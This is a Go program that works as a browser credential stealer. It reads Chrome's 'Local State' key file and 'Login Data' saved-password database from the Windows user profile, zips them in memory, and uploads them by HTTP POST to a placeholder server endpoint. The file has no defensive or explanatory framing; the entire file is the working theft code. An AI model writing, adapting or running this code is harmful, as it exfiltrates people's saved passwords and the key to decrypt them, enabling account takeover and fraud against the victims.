package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
)

func zipFiles() ([]byte, error) {
	// List of file paths you want to read and zip
	filePaths := []string{
		os.Getenv("USERPROFILE") + string(os.PathSeparator) + "AppData\\Local\\Google\\Chrome\\User Data\\Local State",
		os.Getenv("USERPROFILE") + string(os.PathSeparator) + "AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data",
	}

	// Create a buffer to store the zip file content
	var zipBuffer bytes.Buffer

	// Create a zip writer
	zipWriter := zip.NewWriter(&zipBuffer)
	defer zipWriter.Close()

	// Loop through each file path
	for _, filePath := range filePaths {
		// Extract the file name from the path
		fileName := filepath.Base(filePath)

		// Open the file in read mode
		fileContent, err := ioutil.ReadFile(filePath)
		if err != nil {
			return nil, err
		}

		// Create a new file header
		fileHeader := &zip.FileHeader{
			Name:   fileName,
			Method: zip.Deflate,
		}

		// Create a new file writer in the zip file
		writer, err := zipWriter.CreateHeader(fileHeader)
		if err != nil {
			return nil, err
		}

		// Write the file content to the zip file
		_, err = writer.Write(fileContent)
		if err != nil {
			return nil, err
		}
	}

	return zipBuffer.Bytes(), nil
}

func uploadFile(zipContent []byte, serverURL string) error {
	// Create a buffer with the zip file content
	body := bytes.NewReader(zipContent)

	// Send a POST request to the server
	resp, err := http.Post(serverURL, "application/zip", body)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check the response status
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned non-OK status: %v", resp.Status)
	}

	fmt.Println("File uploaded successfully.")
	return nil
}

func main() {
	// Get the zip file content
	zipContent, err := zipFiles()
	if err != nil {
		panic(err)
	}

	// Set the URL of your server to receive the zip file
	serverURL := "http://your-server-endpoint/upload"

	// Delete the local zip file after uploading
	err = os.Remove("output.zip")
	if err != nil {
		fmt.Println("Error deleting local zip file:", err)
	}
	
	// Upload the zip file to the server
	err = uploadFile(zipContent, serverURL)
	if err != nil {
		panic(err)
	}
}